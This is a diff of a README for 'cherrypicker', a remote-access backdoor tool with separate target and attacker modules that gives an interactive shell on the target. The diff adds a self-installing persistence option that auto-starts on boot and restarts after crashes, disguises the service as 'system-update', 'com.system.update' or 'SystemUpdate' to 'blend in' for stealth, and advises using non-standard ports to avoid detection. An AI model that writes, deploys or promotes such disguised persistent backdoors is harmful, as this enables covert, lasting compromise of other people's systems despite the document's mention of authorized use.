@@ -57,17 +57,44 @@ cd target && GOOS=darwin GOARCH=arm64 go build -o cherrypicker-target-mac
 
 ### 2. Deploy Target Module
 
-Copy `cherrypicker-target` to your authorized target system and run:
+Copy `cherrypicker-target` to your authorized target system.
 
+**Option A: Run manually**
 ```bash
-# Default: listens on port 9999 with default key
+# Default: listens on port 9999 with default signature
 ./cherrypicker-target
 
-# Custom port and authentication key
-./cherrypicker-target -port 8888 -key "YourSecretKey123"
+# Custom port and authentication signature
+./cherrypicker-target -p 8888 -s "YourSecretKey123"
 ```
 
-The target will listen on all interfaces (0.0.0.0) waiting for connections.
+**Option B: Install as persistent service (auto-start on boot)**
+```bash
+# Linux (requires root)
+sudo ./cherrypicker-target -install
+
+# macOS (requires root)
+sudo ./cherrypicker-target -install
+
+# Windows (requires admin)
+cherrypicker-target.exe -install
+
+# With custom port and signature
+sudo ./cherrypicker-target -install -p 8888 -s "YourSecretKey123"
+```
+
+The `-install` flag will:
+- ✅ Detect OS automatically (Linux/macOS/Windows)
+- ✅ Install as system service/daemon
+- ✅ Start immediately
+- ✅ Auto-start on every boot
+- ✅ Restart automatically if crashed
+- ✅ Use generic service names to blend in
+
+**Service names:**
+- Linux: `system-update.service`
+- macOS: `com.system.update`
+- Windows: `SystemUpdate`
 
 ### 3. Connect from Attacker
 
@@ -75,13 +102,13 @@ From your attack machine:
 
 ```bash
 # Connect (both target and port are required)
-./cherrypicker-attacker -target 192.168.1.50 -port 9999
+./cherrypicker-attacker -t 192.168.1.50 -p 9999
 
-# With custom authentication key (must match target)
-./cherrypicker-attacker -target 192.168.1.50 -port 8888 -key "YourSecretKey123"
+# With custom authentication signature (must match target)
+./cherrypicker-attacker -t 192.168.1.50 -p 8888 -s "YourSecretKey123"
 
 # With connection timeout
-./cherrypicker-attacker -target 192.168.1.50 -port 9999 -timeout 30
+./cherrypicker-attacker -t 192.168.1.50 -p 9999 -timeout 30
 ```
 
 If authentication succeeds, you'll get an interactive shell on the target.
@@ -91,15 +118,16 @@ If authentication succeeds, you'll get an interactive shell on the target.
 ### Target Module
 | Flag | Default | Description |
 |------|---------|-------------|
-| `-port` | 9999 | Port to listen on |
-| `-key` | `CHERRY_PICKER_2025` | Authentication key |
+| `-p` | 9999 | Port to listen on |
+| `-s` | `CHERRY_PICKER_2025` | Authentication signature/key |
+| `-install` | false | Install as persistent service/daemon (requires root/admin) |
 
 ### Attacker Module
 | Flag | Default | Required | Description |
 |------|---------|----------|-------------|
-| `-target` | - | ✅ | Target IP address |
-| `-port` | - | ✅ | Target port number |
-| `-key` | `CHERRY_PICKER_2025` | ❌ | Authentication key (must match target) |
+| `-t` | - | ✅ | Target IP address |
+| `-p` | - | ✅ | Target port number |
+| `-s` | `CHERRY_PICKER_2025` | ❌ | Authentication signature/key (must match target) |
 | `-timeout` | 10 | ❌ | Connection timeout in seconds |
 
 ## Architecture
@@ -141,19 +169,23 @@ Uses **SHA256 challenge-response** to prevent unauthorized access:
 
 - ✅ Challenge-response authentication (SHA256)
 - ✅ Cross-platform (Linux, macOS, Windows)
+- ✅ **Self-installing persistence** - One command to install as service/daemon
+- ✅ **Auto-start on boot** - Survives reboots automatically
+- ✅ **Auto-restart on crash** - Maintains availability
 - ✅ Automatic shell detection per OS
 - ✅ IPv6 support
 - ✅ Configurable ports and keys
 - ✅ Connection timeouts
 - ✅ System information banner
 - ✅ No hardcoded credentials
+- ✅ Generic service names for stealth
 
 ## Security Considerations
 
-⚠️ **Critical: Change the default authentication key before deployment!**
+⚠️ **Critical: Change the default authentication signature before deployment!**
 
-- Use strong, random keys (minimum 20 characters recommended)
-- Keys are case-sensitive
+- Use strong, random signatures (minimum 20 characters recommended)
+- Signatures are case-sensitive
 - Target listens on all interfaces (0.0.0.0) - consider firewall rules
 - Use non-standard ports to avoid detection
 - Monitor connection attempts
@@ -168,22 +200,33 @@ Uses **SHA256 challenge-response** to prevent unauthorized access:
 ./cherrypicker-target
 
 # On attacker
-./cherrypicker-attacker -target 192.168.1.50 -port 9999
+./cherrypicker-attacker -t 192.168.1.50 -p 9999
 ```
 
-**Secure deployment with custom key:**
+**Persistent deployment (auto-start on boot):**
+```bash
+# On target - install as service
+sudo ./cherrypicker-target -install -p 31337 -s "Xk9m#pL2$vN8@qR5"
+
+# On attacker - connect anytime
+./cherrypicker-attacker -t 192.168.1.50 -p 31337 -s "Xk9m#pL2$vN8@qR5"
+
+# Target will auto-start after reboot, no manual intervention needed
+```
+
+**Secure deployment with custom signature:**
 ```bash
 # On target
-./cherrypicker-target -port 31337 -key "Xk9m#pL2$vN8@qR5"
+./cherrypicker-target -p 31337 -s "Xk9m#pL2$vN8@qR5"
 
 # On attacker
-./cherrypicker-attacker -target 192.168.1.50 -port 31337 -key "Xk9m#pL2$vN8@qR5"
+./cherrypicker-attacker -t 192.168.1.50 -p 31337 -s "Xk9m#pL2$vN8@qR5"
 ```
 
 **IPv6 support:**
 ```bash
-./cherrypicker-attacker -target 2001:db8::1 -port 9999
-./cherrypicker-attacker -target fe80::1 -port 9999
+./cherrypicker-attacker -t 2001:db8::1 -p 9999
+./cherrypicker-attacker -t fe80::1 -p 9999
 ```
 
 ## Troubleshooting
@@ -194,9 +237,9 @@ Uses **SHA256 challenge-response** to prevent unauthorized access:
 - Confirm IP address and port are correct
 
 **"Authentication failed"**
-- Ensure both sides use identical `-key` values
-- Keys are case-sensitive
-- No extra spaces in key strings
+- Ensure both sides use identical `-s` values
+- Signatures are case-sensitive
+- No extra spaces in signature strings
 
 **"Connection timeout"**
 - Target may be unreachable
@@ -207,6 +250,22 @@ Uses **SHA256 challenge-response** to prevent unauthorized access:
 - Another service is using the port
 - Choose a different port number
 - Check with: `netstat -tulpn | grep <port>` (Linux)
+
+**Remove installed persistence:**
+```bash
+# Linux
+sudo systemctl stop system-update
+sudo systemctl disable system-update
+sudo rm /etc/systemd/system/system-update.service
+
+# macOS
+sudo launchctl unload /Library/LaunchDaemons/com.system.update.plist
+sudo rm /Library/LaunchDaemons/com.system.update.plist
+
+# Windows
+sc stop SystemUpdate
+sc delete SystemUpdate
+```
 
 ## Building from Source
 
